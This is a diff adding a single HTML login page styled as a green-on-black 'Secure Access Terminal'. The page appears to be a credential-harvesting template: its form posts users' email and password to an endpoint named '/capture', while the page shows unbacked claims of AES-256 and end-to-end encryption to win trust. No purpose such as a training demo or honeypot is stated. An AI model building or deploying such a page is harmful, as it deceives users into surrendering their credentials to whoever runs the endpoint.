@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Secure Login Portal</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{
+    background:#0a0f0a;
+    font-family:'Courier New',Courier,monospace;
+    display:flex;flex-direction:column;align-items:center;justify-content:center;
+    min-height:100vh;padding:20px
+  }
+  .scanline{
+    position:fixed;inset:0;pointer-events:none;
+    background:repeating-linear-gradient(0deg,rgba(0,0,0,.05) 0px,rgba(0,0,0,.05) 1px,transparent 1px,transparent 2px);
+    z-index:10
+  }
+  .logo-wrap{margin-bottom:8px;text-align:center}
+  .logo-wrap pre{
+    color:#00ff41;font-size:.65rem;line-height:1.2;
+    text-shadow:0 0 8px #00ff41
+  }
+  .card{
+    background:#050d05;border:1px solid #00ff41;width:420px;max-width:100%;
+    box-shadow:0 0 20px rgba(0,255,65,.15),inset 0 0 20px rgba(0,255,65,.02)
+  }
+  .card-header{
+    background:#001a00;border-bottom:1px solid #00ff41;
+    padding:8px 16px;display:flex;align-items:center;justify-content:space-between
+  }
+  .card-header .title{color:#00ff41;font-size:.8rem;letter-spacing:.15em}
+  .card-header .dots{display:flex;gap:6px}
+  .card-header .dot{width:8px;height:8px;border-radius:50%}
+  .dot-r{background:#ff5f57}.dot-y{background:#febc2e}.dot-g{background:#28c840}
+  .card-body{padding:28px 28px 24px}
+  .status-bar{
+    background:#001a00;border:1px solid #00ff41;padding:6px 12px;
+    font-size:.7rem;color:#00e5ff;margin-bottom:24px;
+    display:flex;align-items:center;gap:8px
+  }
+  .blink{animation:blink .8s step-end infinite}
+  @keyframes blink{50%{opacity:0}}
+  .field{margin-bottom:18px}
+  .field label{
+    display:block;font-size:.7rem;color:#00e5ff;letter-spacing:.12em;
+    text-transform:uppercase;margin-bottom:6px
+  }
+  .field input{
+    width:100%;background:#000;border:1px solid #00ff41;
+    color:#00ff41;padding:9px 12px;font-size:.9rem;
+    font-family:inherit;outline:none;caret-color:#00ff41
+  }
+  .field input:focus{border-color:#00e5ff;box-shadow:0 0 6px rgba(0,229,255,.3)}
+  .field input::placeholder{color:#1a4d1a}
+  .btn{
+    width:100%;background:#00ff41;color:#000;border:none;
+    padding:10px;font-size:.85rem;font-weight:700;cursor:pointer;
+    letter-spacing:.15em;font-family:inherit;
+    text-shadow:none;transition:all .15s
+  }
+  .btn:hover{background:#00e53a;box-shadow:0 0 12px rgba(0,255,65,.5)}
+  .btn:active{background:#00cc33}
+  .info-row{
+    display:flex;justify-content:space-between;align-items:center;
+    margin-top:16px;padding-top:12px;border-top:1px solid #001a00;
+    font-size:.65rem;color:#1a4d1a
+  }
+  .info-row span{color:#00ff41}
+</style>
+</head>
+<body>
+<div class="scanline"></div>
+<div class="logo-wrap">
+<pre>
+ ███████╗███████╗ ██████╗
+ ██╔════╝██╔════╝██╔════╝
+ ███████╗█████╗  ██║
+ ╚════██║██╔══╝  ██║
+ ███████║███████╗╚██████╗
+ ╚══════╝╚══════╝ ╚═════╝
+</pre>
+</div>
+<div class="card">
+  <div class="card-header">
+    <span class="title">SECURE ACCESS TERMINAL v2.4</span>
+    <div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+  </div>
+  <div class="card-body">
+    <div class="status-bar">
+      <span class="blink">█</span>
+      <span>SYSTEM ONLINE · ENCRYPTION: AES-256 · AUTH REQUIRED</span>
+    </div>
+    <form method="POST" action="/capture" autocomplete="on">
+      <div class="field">
+        <label>Username / Email</label>
+        <input name="email" type="text" placeholder="user@domain.com" required autocomplete="username">
+      </div>
+      <div class="field">
+        <label>Password</label>
+        <input name="password" type="password" placeholder="••••••••••••" required autocomplete="current-password">
+      </div>
+      <button class="btn" type="submit">[ AUTHENTICATE ]</button>
+    </form>
+    <div class="info-row">
+      <span>🔒 <span>END-TO-END ENCRYPTED</span></span>
+      <span>SESSION: <span>0x7F3A</span></span>
+    </div>
+  </div>
+</div>
+</body>
+</html>
